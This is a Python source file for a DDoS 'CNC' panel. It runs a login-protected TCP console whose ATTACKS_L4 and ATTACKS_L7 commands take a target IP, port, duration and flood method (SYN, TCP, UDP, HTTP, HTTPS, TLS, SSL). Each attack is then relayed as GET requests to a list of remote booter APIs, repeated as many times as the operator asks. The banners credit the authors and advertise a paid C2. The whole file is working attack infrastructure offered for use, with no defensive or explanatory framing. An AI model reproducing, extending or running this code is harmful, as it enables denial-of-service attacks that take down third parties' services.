import os
import socket
import time
import threading
import requests
import sys
import random
from colored import fg,attr

PORT_SERVER = 0
LIST_LOGIN = []
KEY_ACCESS = 'API_CNC'

banner_attack = f'''
{fg(70)}      ╦ ╦╔═╗═╗ ╦ {fg(70)}╔═╗╔╗╔╔═╗
{fg(71)}      ╠═╣║╣ ╔╩╦╝ {fg(71)}║  ║║║║  
{fg(72)}      ╩ ╩╚═╝╩ ╚═{fg(255)}o{fg(72)}╚═╝╝╚╝╚═╝
{fg(196)}╔══════════════════════════════
{fg(196)}║ {fg(255)}WAIT . . .
{fg(196)}╠══════════════════════════════
{fg(196)}║{fg(196)}      IP {fg(255)}TARGET
{fg(197)}║{fg(197)}    PORT {fg(255)}NUMBER
{fg(197)}║{fg(198)} METHODS {fg(255)}NAME
{fg(197)}╚══════════════════════════════'''

banner_ask = f'''
{fg(70)} .d88b.                 .d88b.
{fg(71)}.8P  Y8. db   d8b   db .8P  Y8.
{fg(72)}88    88 88   I8I   88 88    88
{fg(73)}88    88 Y8   I8I   88 88    88
{fg(74)}`8b  d8' `8b d8'8b d8' `8b  d8'
{fg(75)} `Y88P'   `8b8' `8d8'   `Y88P'
                         
     {fg(196)}LOGIN {fg(197)}OR {fg(198)}REGISTER {fg(199)}?'''

banner_register = f'''
{fg(226)} .d88b.            .d88b.
{fg(227)}.8P  Y8.          .8P  Y8.
{fg(228)}88    88          88    88
{fg(229)}88    88          88    88
{fg(230)}`8b  d8'          `8b  d8'
{fg(231)} `Y88P'  C888888D  `Y88P'

 {fg(196)}.: {fg(124)}WELCOME {fg(125)}TO {fg(126)}REGISER {fg(196)}:.'''

banner_login = f'''
{fg(196)}db   db d88888b db    db   {fg(202)}  .o88b. d8b   db  .o88b.
{fg(197)}88   88 88'     `8b  d8'   {fg(203)} d8P  Y8 888o  88 d8P  Y8
{fg(198)}88ooo88 88ooooo  `8bd8'    {fg(204)} 8P      88V8o 88 8P 
{fg(199)}88ooo88 88ooooo  .dPYb.    {fg(205)} 8b      88 V8o88 8b 
{fg(200)}88   88 88.     .8P  Y8.   {fg(206)} Y8b  d8 88  V888 Y8b  d8
{fg(201)}YP   YP Y88888P YP    YP   {fg(207)}  `Y88P' VP   V8P  `Y88P'

                {fg(70)}WELCOME {fg(71)}TO {fg(72)}LOGIN {fg(73)}PAGE'''

banner_first = f'''
{fg(196)}db   db d88888b db    db   {fg(202)}  .o88b. d8b   db  .o88b.
{fg(197)}88   88 88'     `8b  d8'   {fg(203)} d8P  Y8 888o  88 d8P  Y8
{fg(198)}88ooo88 88ooooo  `8bd8'    {fg(204)} 8P      88V8o 88 8P 
{fg(199)}88ooo88 88ooooo  .dPYb.    {fg(205)} 8b      88 V8o88 8b 
{fg(200)}88   88 88.     .8P  Y8.   {fg(206)} Y8b  d8 88  V888 Y8b  d8
{fg(201)}YP   YP Y88888P YP    YP   {fg(207)}  `Y88P' VP   V8P  `Y88P'

         {fg(196)}[ {fg(226)}+ {fg(196)}] {fg(70)}WELCOME {fg(71)}TO {fg(72)}API {fg(73)}CNC {fg(196)}[ {fg(226)}+ {fg(196)}]
{fg(70)}TYPE {fg(71)}HELP {fg(72)}FOR {fg(73)}SHOW {fg(74)}COMMAND'''

banner_logo = f'''
{fg(196)}db   db d88888b db    db   {fg(202)}  .o88b. d8b   db  .o88b.
{fg(197)}88   88 88'     `8b  d8'   {fg(203)} d8P  Y8 888o  88 d8P  Y8
{fg(198)}88ooo88 88ooooo  `8bd8'    {fg(204)} 8P      88V8o 88 8P 
{fg(199)}88ooo88 88ooooo  .dPYb.    {fg(205)} 8b      88 V8o88 8b 
{fg(200)}88   88 88.     .8P  Y8.   {fg(206)} Y8b  d8 88  V888 Y8b  d8
{fg(201)}YP   YP Y88888P YP    YP   {fg(207)}  `Y88P' VP   V8P  `Y88P' '''

banner_help = f'''
{fg(196)}╔══════════════════════════════════╗
{fg(196)}║ {fg(255)}CLASSIC COMMAND                  {fg(196)}║
{fg(196)}╠════════╦═════════════════════════╬════════════════════════════════════╗
{fg(196)}║ {fg(255)}HELP   {fg(196)}║ {fg(255)}FOR SHOW LIST COMMAND   {fg(196)}║ {fg(255)}ATTACKS COMMAND                    {fg(196)}║
{fg(196)}║ {fg(255)}CLS    {fg(196)}║ {fg(255)}FOR CLEAR CONSOLE       {fg(196)}╠═════════╦══════════════════════════╣
{fg(196)}║ {fg(255)}MENU   {fg(196)}║ {fg(255)}FOR REUTRN BACK         {fg(196)}║ {fg(255)}LAYER7  {fg(196)}║ {fg(255)}FOR SHOW LIST METHODS.L7 {fg(196)}║
{fg(196)}║ {fg(255)}BANNER {fg(196)}║ {fg(255)}FOR SHOW BANNER         {fg(196)}║ {fg(255)}LAYER4  {fg(196)}║ {fg(255)}FOR SHOW LIST METHODS.L4 {fg(196)}║
{fg(196)}║ {fg(255)}API    {fg(196)}║ {fg(255)}FOR SHOW ALL API ONLINE {fg(196)}║ {fg(255)}ATTACKS {fg(196)}║ {fg(255)}FOR ATTACK TARGET        {fg(196)}║
{fg(196)}║ {fg(255)}EXIT   {fg(196)}║ {fg(255)}FOR EXIT                {fg(196)}║ {fg(255)}LIST    {fg(196)}║ {fg(255)}FOR SHOW LIST ATTACK     {fg(196)}║
{fg(196)}╚═╦══════╩═════════════════════════╩═╦═══════╩══════════════════════════╝
{fg(196)}  ║ {fg(255)}DATABASE COMMAND                 {fg(196)}║         |
{fg(196)}  ╠════════════╦═════════════════════╣        / \\
{fg(196)}  ║ {fg(255)}UNREGISTER {fg(196)}║ {fg(255)}FOR UNREGISTER USER {fg(196)}║       / _ \\
{fg(196)}  ║   {fg(255)}REGISTER {fg(196)}║ {fg(255)}FOR REGISTER USER   {fg(196)}║      |.o '.|
{fg(196)}  ╚════════════╩═════════════════════╝      |'._.'|
                                        {fg(196)}    |     |
                                        {fg(196)}  ,'|  |  |`.
                                        {fg(196)} /  |  |  |  \\
                                        {fg(196)} |,-'--|--'-.|' '''

banner_layer7 = f'''
{fg(196)}                                         _.oo.
{fg(197)}                 _.u[[/;:,.         .odMMMMMM' 
{fg(198)}              .o888UU[[[/;:-.  .o@P^    MMM^                                                         |
{fg(199)}             oN88888UU[[[/;::-.        dP^                                                          / \\
{fg(200)}            dNMMNN888UU[[[/;:--.   .o@P^   ╔═════════════════════════════════════════════╗         / _ \\
{fg(201)}           ,MMMMMMN888UU[[/;::-. o@^       ║  ━ ═ ━ ═ ━ WELCOME TO HUB.Layer7 ━ ═ ━ ═ ━  ║        |.o '.|
{fg(207)}           NNMMMNN888UU[[[/~.o@P^          ╚═════════════════════════════════════════════╝        |'._.'|
{fg(206)}           888888888UU[[[/o@^-..            ╔════════╗ ╔════════╗  ╔═════════╗ ╔════════╗         |     |
{fg(205)}          oI8888UU[[[/o@P^:--..             ║  HTTP  ║ ║   SSH  ║  ║  HTTPS  ║ ║   TLS  ║       ,'|  |  |`.
{fg(204)}       .@^  YUU[[[/o@^;::---..              ╚════════╝ ╚════════╝  ╚═════════╝ ╚════════╝      /  |  |  |  \\
{fg(203)}     oMP     ^/o@P^;:::---..                ╔════════╗ ╔════════╗  ╔═════════╗ ╔════════╗      |,-'--|--'-.|
{fg(202)}  .dMMM    .o@^ ^;::---...                  ║  SSL   ║ ║ XXXXXX ║  ║ XXXXXXX ║ ║ XXXXXX ║
{fg(208)} dMMMMMMM@^`       `^^^^                    ╚════════╝ ╚════════╝  ╚═════════╝ ╚════════╝
{fg(209)}YMMMUP^                                    ╔═════════════════════════════════════════════╗
{fg(210)} ^^                                        ║ ━ ═ ━ ═ ━ MADE BY IDKHEX1629#3051 ━ ═ ━ ═ ━ ║
{fg(211)}                                           ╚═════════════════════════════════════════════╝'''

banner_layer4 = f'''
{fg(70)}                     .::.  ╔══════════════════════════════════════════════════════════╗═╗
{fg(71)}                  .:'  .:  ║ ━ ━ ━ ━ ━ ━ ━ WELCOME TO HUB.HEX-XS.LAYER4 ━ ━ ━ ━ ━ ━ ━ ║ ║
{fg(72)}        ,MMM8&&&.:'   .:'  ╠═══╦═════════╦════════════════════════════════════════════╣ ║
{fg(73)}       MMMMM88&&&&  .:'    ║ 1 ║   SYN   ║ Make the target down ( small target )      ║ ║
{fg(74)}      MMMMM88&&&&&&:'      ╠═══╬═════════╬════════════════════════════════════════════╣ ║
{fg(75)}      MMMMM88&&&&&&        ║ 2 ║   TCP   ║ Transmission Control Protocol flood packet ║ ║
{fg(45)}    .:MMMMM88&&&&&&        ╠═══╬═════════╬════════════════════════════════════════════╣ ║
{fg(44)}  .:'  MMMMM88&&&&         ║ 3 ║   UDP   ║ User Datagram Protocol flood packet        ║ ║
{fg(43)}.:'   .:'MMM8&&&'          ╠═══╬═════════╬════════════════════════════════════════════╣ ║
{fg(42)}:'  .:'                    ║ 4 ║   ADS   ║ BUY Fancy C2 --> HuynhNhatToan#1137        ║ ║
{fg(41)}'::'                       ╠═══╩═════════╩════════════════════════════════════════════╣ ║
{fg(40)}MADE BY HuynhNhatToan#1137 ║ ━ ━ ━ ━ ━ ━ ━ WELCOME TO HUB.HEX-XS.LAYER4 ━ ━ ━ ━ ━ ━ ━ ║ ║
{fg(34)}                           ╚══════════════════════════════════════════════════════════╝═╝'''

loading_screen = f'''
{fg(255)}[     {fg(255)}] {fg(196)}0{fg(255)}%
{fg(255)}[{fg(44)}█    {fg(255)}] {fg(197)}1{fg(255)}%
{fg(255)}[{fg(43)}██   {fg(255)}] {fg(198)}2{fg(255)}%
{fg(255)}[{fg(42)}███  {fg(255)}] {fg(199)}3{fg(255)}%
{fg(255)}[{fg(41)}████ {fg(255)}] {fg(200)}4{fg(255)}%
{fg(255)}[{fg(40)}█████{fg(255)}] {fg(201)}5{fg(255)}%
{fg(255)}[{fg(40)}█████{fg(255)}] {fg(201)}5{fg(255)}%
{fg(255)}[{fg(41)}████ {fg(255)}] {fg(200)}4{fg(255)}%
{fg(255)}[{fg(42)}███  {fg(255)}] {fg(199)}3{fg(255)}%
{fg(255)}[{fg(43)}██   {fg(255)}] {fg(198)}2{fg(255)}%
{fg(255)}[{fg(44)}█    {fg(255)}] {fg(197)}1{fg(255)}%
{fg(255)}[     {fg(255)}] {fg(196)}0{fg(255)}%'''

class CHECKING:
    global KEY_ACCESS,LIST_LOGIN
    DB_SLOW = 5
    API_LOADING = ''
    DB_LOADING = ''
    TIME_SLOW = 5
    REMOVE_USERPASS = ''

    status_server = 'None'

    API_ONLINE = []
    count_api = 0
    all_api = 0
    CHECK_API = ''
    loop_checking_timeout = 25
    time_out_setting = 5
    SPEED = 1
    URL_REUTRN_FAILED = False

    @staticmethod
    def CONFIG_CNC():
        global KEY_ACCESS,LIST_LOGIN
        while True:
            set = ''
            data = os.path.abspath(sys.argv[0])
            directory = os.path.dirname(data)
            if '\\' in data:
               set = '\\'
            else:
               set = '/'
            PATH = f'{directory}{set}assets{set}config.txt'
            COMMAND = LOAD_FILES.READ_FILES(PATH, 'r', 2)
            for command in COMMAND:
                code_got = command.replace('\n', '')
                code = code_got.split('=')
                time.sleep(0.5)
                if code[0] == 'DB_LOAD':
                    if f'{directory}{set}assets{set}users_login{set}{code[1]}' != CHECKING.DB_LOADING:
                        CHECKING.DB_LOADING = f'{directory}{set}assets{set}users_login{set}{code[1]}'
                elif code[0] == 'API_LOAD':
                    if f'{directory}{set}assets{set}api{set}{code[1]}' != CHECKING.API_LOADING:
                        CHECKING.API_LOADING = f'{directory}{set}assets{set}api{set}{code[1]}'
                elif code[0] == 'REMOVE_USERPASS':
                    if code[1] != CHECKING.REMOVE_USERPASS:
                        CHECKING.REMOVE_USERPASS = code[1]
                elif code[0] == 'KEY_ACCESS':
                    if code[1] != KEY_ACCESS:
                        KEY_ACCESS = code[1]
            time.sleep(int(CHECKING.TIME_SLOW))

    @staticmethod
    def DB_GOT():
        global LIST_LOGI
        code_user = len(LIST_LOGIN)
        while True:
            COMMAND = LOAD_FILES.READ_FILES(CHECKING.DB_LOADING, 'r', 2)
            for command in COMMAND:
                data = command.replace('\n', '')
                if data not in CHECKING.REMOVE_USERPASS:
                    if data not in LIST_LOGIN:
                        if ':' in data:
                         LIST_LOGIN.append(data)
                else:
                    if data in LIST_LOGIN:
                        try:
                            LIST_LOGIN.remove(data)
                        except:
                            pass
            time.sleep(int(CHECKING.DB_SLOW))
            if int(len(LIST_LOGIN)) != int(code_user):
             code_user = len(LIST_LOGIN)
    
    @staticmethod
    def DOWNLOAD_API():
        url_got = []
        try:
            data = LOAD_FILES.READ_FILES(CHECKING.API_LOADING,'r',2)
            for got in data:
                got = got.replace('\n', '')
                if len(got) != 0:
                    if 'http://' not in got:
                      url_got.append(f'https://{got}')
                    else:
                      url_got.append(f'{got}')
            return url_got
        except:
            return url_got

    @staticmethod
    def API_CHECKING():
        while True:
            API_URL = CHECKING.DOWNLOAD_API()
            if len(API_URL) != 0:
             CHECKING.URL_REUTRN_FAILED = False
             CHECKING.API_ONLINE.clear()
             CHECKING.count_api = 0
             CHECKING.all_api = 0
             for LINKS in API_URL:
                CHECKING.all_api += 1
                CHECKING.CHECK_API = LINKS
                try:
                    if CHECKING.time_out_setting != 0:
                        r = requests.get(f'{LINKS}', timeout=CHECKING.time_out_setting)
                    else:
                        r = requests.get(f'{LINKS}')
                    if r.status_code == 200:
                        CHECKING.API_ONLINE.append(LINKS)
                        CHECKING.count_api += 1
                    else:
                       print(LINKS)
                except:
                    print(LINKS)
                time.sleep(CHECKING.SPEED)
            else:
                CHECKING.URL_REUTRN_FAILED = True
            time.sleep(CHECKING.loop_checking_timeout)

    @staticmethod
    def CHECK_PORT(PORT,nulled):
        global status_server
        while True:
            try:
             s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s3.settimeout(3)
             s3.connect(('127.0.0.1', int(PORT)))
             CHECKING.status_server = 'ONLINE'
            except:
             CHECKING.status_server = 'OFFLINE'
            time.sleep(5)

class LOAD_FILES:
    @staticmethod
    def READ_FILES(path, mode, type):
        data = ''
        try:
            with open(path, mode) as f:
                if type == 0:
                    data = f.read()
                elif type == 1:
                    data = f.readline()
                elif type == 2:
                    data = f.readlines()
        except Exception as e:
            data = 'FAILED'
        return data

    @staticmethod
    def WRITE_FILES(path, mode, content):
        data = ''
        try:
            with open(path, mode) as f:
                f.write(content)
        except:
            data = 'FAILED'
        return data

class SERVER_BUILDER():
    global PORT_SERVER

    @staticmethod
    def CLIENT_SERVER():
       global PORT_SERVER
       s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       port = 0
       while True:
           try:
            if port == 0:
                port += 1
            else:
                s.bind(('0.0.0.0',port))
                print(f"CONNECTION_TYPE=RAW PORT={port} SERVER RUNNING . . .")
                PORT_SERVER = port
                break
           except:
            port += 1
       s.listen()
       while True:
           try:
              socks,ip = s.accept()
              threading.Thread(target=CLIENT_BUILDER.CLIENT_ASK,args=(socks,ip)).start()
           except:
              pass

class CLIENT_BUILDER():
    global KEY_ACCESS,LIST_LOGIN

    @staticmethod
    def SEND(socket, data, escape=True, reset=True):
        try:
            if reset:
             data += attr(0)
            if escape:
             data += '\r\n'
            socket.send(data.encode())
        except:
           pass
    
    def TITLE_CONTROL(socks,ip,mode):
       try:
        if mode == 'TITLEv2':
         CLIENT_BUILDER.SEND(socks, f"\33]0;WELOCME TO HEX.CNC :: MADE BY .:HEX:.\a", False)
        elif mode == 'TITLE':
          while True:
             CLIENT_BUILDER.SEND(socks, f"\33]0;[|] WELCOME TO HEX.CNC | API ONLINE {CHECKING.count_api} | SERVER={CHECKING.status_server}\a", False)
             time.sleep(0.1)
             CLIENT_BUILDER.SEND(socks, f"\33]0;[/] WELCOME TO HEX.CNC | API ONLINE {CHECKING.count_api} | SERVER={CHECKING.status_server}\a", False)
             time.sleep(0.1)
             CLIENT_BUILDER.SEND(socks, f"\33]0;[-] WELCOME TO HEX.CNC | API ONLINE {CHECKING.count_api} | SERVER={CHECKING.status_server}\a", False)
             time.sleep(0.1)
             CLIENT_BUILDER.SEND(socks, f"\33]0;[\] WELCOME TO HEX.CNC | API ONLINE {CHECKING.count_api} | SERVER={CHECKING.status_server}\a", False)
             time.sleep(0.1)
       except:
          pass
    
    def CLIENT_CONTROL(socks,ip):
        global LIST_LOGIN
        try:
            for x in loading_screen.split('\n'):
               CLIENT_BUILDER.SEND(socks,x)
               time.sleep(0.5)
               CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
            threading.Thread(target=CLIENT_BUILDER.TITLE_CONTROL,args=(socks,ip,'TITLE')).start()
            
            for x in banner_first.split('\n'):
                CLIENT_BUILDER.SEND(socks, x)
                time.sleep(0.1)
        
            prompt = f'{fg(196)}[ {fg(71)}API{fg(214)}@{fg(72)}HEX {fg(196)}] {fg(70)}$'
            CLIENT_BUILDER.SEND(socks,prompt, False)
        
            while 1:
             data = socks.recv(65536).decode().strip()
             if not data:
                continue
             command = data.split(' ')
             COM = command[0].upper()
             if COM == 'HELP':
                for x in banner_help.split('\n'):
                        CLIENT_BUILDER.SEND(socks, x)
                        time.sleep(0.1)
             elif COM == 'LAYER7':        
              for x in banner_layer7.split('\n'):
                        CLIENT_BUILDER.SEND(socks, x)
                        time.sleep(0.1)
             elif COM == 'LAYER4':
              for x in banner_layer4.split('\n'):
                        CLIENT_BUILDER.SEND(socks, x)
                        time.sleep(0.1)
             elif COM == 'BANNER':
               for x in banner_logo.split('\n'):
                    CLIENT_BUILDER.SEND(socks, x)
                    time.sleep(0.1)
             elif COM == 'MENU':
               for x in loading_screen.split('\n'):
                CLIENT_BUILDER.SEND(socks,x)
                time.sleep(0.5)
                CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
               CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
               for x in banner_first.split('\n'):
                    CLIENT_BUILDER.SEND(socks, x)
                    time.sleep(0.1)
             elif COM == 'API':
               CLIENT_BUILDER.SEND(socks,f'{fg(82)}{CHECKING.count_api} {fg(83)}of {fg(84)}{CHECKING.all_api} {fg(85)}API {fg(86)}ONLINE\r\n{fg(130)}CHECKING{fg(131)}={fg(132)}{CHECKING.CHECK_API}')
             elif COM == 'CLS' or COM == 'CLEAR':
                CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
             elif COM == 'EXIT':
                CLIENT_BUILDER.SEND(socks,f'{fg(82)}LOGOUT {fg(83)}. . .')
                socks.close()
             elif COM == 'REGISTER':
                if len(command) == 3:
                   user = command[1]
                   password = command[2]
                   CLIENT_BUILDER.SEND(socks,f'{fg(70)}REGISTER {fg(71)}---> {fg(72)}{user}:{password}')
                   if f'{user}:{password}' not in LIST_LOGIN:
                    LIST_LOGIN.append(f'{user}:{password}')
                else:
                   CLIENT_BUILDER.SEND(socks,f'{fg(196)}REGISTER {fg(197)}<USER> {fg(198)}<PASSWORD>')
             elif COM == 'UNREGISTER':
                if len(command) == 3:
                   user = command[1]
                   password = command[2]
                   CLIENT_BUILDER.SEND(socks,f'{fg(70)}UNREGISTER {fg(71)}---> {fg(72)}{user}:{password}')
                   if f'{user}:{password}' in LIST_LOGIN:
                    LIST_LOGIN.remove(f'{user}:{password}')
                else:
                   CLIENT_BUILDER.SEND(socks,f'{fg(196)}UNREGISTER {fg(197)}<USER> {fg(198)}<PASSWORD>')
             elif COM == 'ATTACKS_L4':
                if len(command) == 6:
                 methods = ["SYN",'TCP','UDP'] 
                 code = 0
                 ip_tar = command[1]
                 port = command[2]
                 sec = command[3]
                 spam_api = command[4]
                 method = command[5]
                 if method in methods:
                    for x in loading_screen.split('\n'):
                     CLIENT_BUILDER.SEND(socks,x)
                     time.sleep(0.5)
                     CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
                    for x in banner_attack.split('\n'):
                       CLIENT_BUILDER.SEND(socks,x.replace('TARGET',ip_tar).replace('NUMBER',port).replace('NAME',f"{method}_HEX1629").replace('WAIT',f'ATTACK --> {len(CHECKING.API_ONLINE)}'))
                       time.sleep(0.1)
                    code = 1
                 if code == 1:
                   api_list = CHECKING.API_ONLINE
                   apiv1 = '/TARGET=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
                   api1 = apiv1.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
                   apiv2 = '/TARGET2=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
                   api2 = apiv2.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
                   apiv3 = '/IP=IP2&PORT=NUMBER&TIME=THREAD&METHODS=METHODS2_HEX1629'
                   api3 = apiv3.replace('IP2',ip_tar).replace('NUMBER',port).replace('THREAD',sec).replace('METHODS2',method)
                   if len(api_list) != 0:
                     for _ in range(int(spam_api)):
                       for url_api in api_list:
                        if CHECKING.time_out_setting != 0:
                         r = requests.get(f'{url_api}{api1}', timeout=CHECKING.time_out_setting)
                        else:
                         r = requests.get(f'{url_api}{api1}')
                        if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT v1,v2
                         if CHECKING.time_out_setting != 0:
                          r = requests.get(f'{url_api}{api2}', timeout=CHECKING.time_out_setting)
                         else:
                          r = requests.get(f'{url_api}{api2}')
                         if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT v4,v5
                          if CHECKING.time_out_setting != 0:
                           r = requests.get(f'{url_api}{api3}', timeout=CHECKING.time_out_setting)
                          else:
                           r = requests.get(f'{url_api}{api3}')
                 else:
                    CLIENT_BUILDER.SEND(socks,f'{fg(196)}METHODS NOT FOUND')
                else:
                   CLIENT_BUILDER.SEND(socks, f"{fg(196)}ATTACKS_L4 <IP> <PORT> <TIME> <SPAM_API> <METHODS>\r\n{fg(197)}METHODS CHOOSE TCP UDP OR SYN")
             elif COM == 'ATTACKS_L7':
                if len(command) == 7:
                 methods = ['HTTP','HTTPS','TLS','SSL'] 
                 code = 0
                 ip_tar = command[1]
                 port = command[2]
                 sec = command[3]
                 spam_api = command[4]
                 method_got = command[5]
                 method = command[6]
                 if method in methods:
                    for x in loading_screen.split('\n'):
                     CLIENT_BUILDER.SEND(socks,x)
                     time.sleep(0.5)
                     CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
                    for x in banner_attack.split('\n'):
                       CLIENT_BUILDER.SEND(socks,x.replace('TARGET',ip_tar).replace('NUMBER',port).replace('NAME',f"{method}_HEX1629").replace('WAIT',f'ATTACK --> {len(CHECKING.API_ONLINE)}'))
                       time.sleep(0.1)
                    code = 1
                 if code == 1:
                   api_list = CHECKING.API_ONLINE
                   apiv1 = '/TARGET=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
                   api1 = apiv1.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
                   apiv2 = '/TARGET=IP&PORT=NUM&TIME=SEC&PACKET=HTTP&TYPE=METHODS2_HEX1629'
                   api2 = apiv2.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('HTTP',method_got).replace('METHODS2',method)
                   if len(api_list) != 0:
                     for _ in range(int(spam_api)):
                       for url_api in api_list:
                        if CHECKING.time_out_setting != 0:
                         r = requests.get(f'{url_api}{api1}', timeout=CHECKING.time_out_setting)
                        else:
                         r = requests.get(f'{url_api}{api1}')
                        if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT v1,v2,v3
                          if CHECKING.time_out_setting != 0:
                           r = requests.get(f'{url_api}{api2}', timeout=CHECKING.time_out_setting)
                          else:
                           r = requests.get(f'{url_api}{api2}')
                 else:
                    CLIENT_BUILDER.SEND(socks,f'{fg(196)}METHODS NOT FOUND')
                else:
                   CLIENT_BUILDER.SEND(socks, f"{fg(196)}ATTACKS_L7 <IP> <PORT> <TIME> <SPAM_API> <HTTP> <METHODS>\r\n{fg(197)}METHODS CHOOSE HTTP HTTPS TLS OR SSL")
             elif COM == 'ATTACKS':
                CLIENT_BUILDER.SEND(socks, f"{fg(196)}ATTACK COMMAND --> L7 USE ATTACKS_L7 L4 USE ATTACKS_L4")
             elif COM == 'LOADING':
              for x in loading_screen.split('\n'):
               CLIENT_BUILDER.SEND(socks,x)
               time.sleep(0.5)
               CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
             else:
                CLIENT_BUILDER.SEND(socks,f'{fg(196)}COMMAND NOT FOUND')
             CLIENT_BUILDER.SEND(socks, prompt, False)
        except:
           pass

    @staticmethod
    def CLIENT_ASK(socks,ip):
        global LIST_LOGIN
        try:
            threading.Thread(target=CLIENT_BUILDER.TITLE_CONTROL,args=(socks,ip,'TITLEv2')).start()
            SEND_1 = 0
            
            for x in banner_ask.split('\n'):
             CLIENT_BUILDER.SEND(socks,x)
             time.sleep(0.1)
            
            while 1:
                if SEND_1 == 0:
                 SEND_1 = 1
                 CLIENT_BUILDER.SEND(socks, f'\x1b{fg(40)}MODE $\x1b[0m ', False, False)
                mode = socks.recv(65536).decode().strip()
                if not mode:
                  continue
                break

            if mode.upper() == 'LOGIN':
                CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
                threading.Thread(target=CLIENT_BUILDER.CLIENT_LOGIN,args=(socks,ip)).start()
            elif mode.upper() == 'REGISTER':
                CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
                threading.Thread(target=CLIENT_BUILDER.CLIENT_REGISER,args=(socks,ip)).start()
            else:
                CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
                threading.Thread(target=CLIENT_BUILDER.CLIENT_ASK,args=(socks,ip)).start()
        except:
            pass
    
    @staticmethod
    def CLIENT_REGISER(socks,ip):
        global LIST_LOGIN,KEY_ACCESS
        try:
            SEND_1 = 0
            SEND_2 = 0
            SEND_3 = 0
            
            for x in banner_register.split('\n'):
                CLIENT_BUILDER.SEND(socks, x)
                time.sleep(0.1)
            
            while 1:
                if SEND_1 == 0:
                 SEND_1 = 1
                 CLIENT_BUILDER.SEND(socks, f'\x1b{fg(40)}Username $\x1b[0m ', False, False)
                username = socks.recv(65536).decode().strip()
                if not username:
                  continue
                break

            while 1:
                if SEND_2 == 0:
                    SEND_2 = 1
                    CLIENT_BUILDER.SEND(socks, f'\x1b{fg(41)}Password $\x1b[0m ', False, False)
                password = socks.recv(65536).decode().strip()
                if not password:
                  continue
                break

            while 1:
                if SEND_3 == 0:
                    SEND_3 = 1
                    CLIENT_BUILDER.SEND(socks, f'\x1b{fg(42)}Key $\x1b[0m ', False, False)
                key = socks.recv(65536).decode().strip()
                if not key:
                  continue
                break

            reg = False
            access = False
            if key == KEY_ACCESS:
                access = True
                if f'{username}:{password}' not in LIST_LOGIN:
                    reg = True

            if access == True:
              if reg == True:
                CLIENT_BUILDER.SEND(socks,f'{fg(70)}ACCESS REGISTER . . .')
                LIST_LOGIN.append(f'{username}:{password}')
                print(LIST_LOGIN)
                time.sleep(3)
                CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
                threading.Thread(target=CLIENT_BUILDER.CLIENT_LOGIN,args=(socks,ip)).start()
              else:
                CLIENT_BUILDER.SEND(socks,f'{fg(70)}IT HAVE USER . . .')
                time.sleep(1)
                CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
                threading.Thread(target=CLIENT_BUILDER.CLIENT_LOGIN,args=(socks,ip)).start()
            else:
                CLIENT_BUILDER.SEND(socks,f'{fg(70)}FAILED ACCESS REGISTER . . .')
                time.sleep(1)
                socks.close()
        except:
            pass

    @staticmethod
    def CLIENT_LOGIN(socks,ip):
        global LIST_LOGIN
        try:
            SEND_1 = 0
            SEND_2 = 0
            
            for x in banner_login.split('\n'):
                CLIENT_BUILDER.SEND(socks, x)
                time.sleep(0.1)
            
            while 1:
                if SEND_1 == 0:
                 SEND_1 = 1
                 CLIENT_BUILDER.SEND(socks, f'\x1b{fg(40)}Username $\x1b[0m ', False, False)
                username = socks.recv(65536).decode().strip()
                if not username:
                  continue
                break

            while 1:
                if SEND_2 == 0:
                    SEND_2 = 1
                    CLIENT_BUILDER.SEND(socks, f'\x1b{fg(41)}Password $\x1b[0m ', False, False)
                password = socks.recv(65536).decode().strip()
                if not password:
                  continue
                break

            user_got = False
            for user_got_xd in LIST_LOGIN:
                all_list = user_got_xd.split(':')
                if all_list[0] == username and all_list[1] == password:
                    user_got = True
                    break
            
            if user_got == True:
                CLIENT_BUILDER.SEND(socks,'\033[2J\033[H')
                threading.Thread(target=CLIENT_BUILDER.CLIENT_CONTROL,args=(socks,ip)).start()
            else:
                CLIENT_BUILDER.SEND(socks,f'{fg(196)}YOU USER:PASS IT NOT FOUND . . .')
                time.sleep(1)
                socks.close()
        except:
            pass

threading.Thread(target=CHECKING.CONFIG_CNC).start()
threading.Thread(target=CHECKING.DB_GOT).start()
time.sleep(2)
threading.Thread(target=SERVER_BUILDER.CLIENT_SERVER).start()
threading.Thread(target=CHECKING.API_CHECKING).start()
threading.Thread(target=CHECKING.CHECK_PORT, args=(PORT_SERVER, 'HI'), group=None).start()
